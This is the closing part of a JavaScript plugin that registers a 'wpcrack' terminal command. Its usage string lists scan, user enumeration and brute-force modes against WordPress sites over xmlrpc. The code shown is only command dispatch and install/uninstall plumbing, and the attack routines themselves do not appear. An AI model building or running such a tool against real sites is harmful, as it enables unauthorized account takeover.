      if (cmd === 'brute') return await cmdBrute(target, flags, api);
      return [L(`unknown command: ${cmd}. Try "wpcrack help".`, 'danger')];
    } catch (e) {
      return [L(`❌ error: ${e.message}`, 'danger')];
    }
  };

  // ============ Lifecycle ============
  const install = async api => {
    if (!api || typeof api !== 'object') throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    const required = ['registerCommand', 'unregisterCommand', 'line', 'spacer'];
    for (const m of required) {
      if (typeof api[m] !== 'function') throw new Error(`PACKAGE_BRIDGE_${m.toUpperCase()}_UNAVAILABLE`);
    }
    state.api = api;
    const registered = api.registerCommand('wpcrack', {
      description: MANIFEST.description,
      usage: 'wpcrack <scan|lowscan|users|brute|help|version> [url] [--xmlrpc] [--low]',
      aliases: [],
      kind: 'plain',
      run: async ({ args = [], api: scopedApi } = {}) => {
        state.api = scopedApi || state.api;
        return await dispatch({ args, api: state.api });
      }
    });
    if (registered === false) {
      state.api = null;
      throw new Error('PACKAGE_COMMAND_REGISTRATION_FAILED');
    }
    return [];
  };

  const uninstall = async api => {
    const bridge = api || state.api;
    try { if (bridge?.unregisterCommand) bridge.unregisterCommand('wpcrack'); } catch {}
    state.api = null;
    return [];
  };

  globalThis[GLOBAL_KEY] = Object.freeze({
    manifest: MANIFEST,
    install,
    uninstall
  });
})();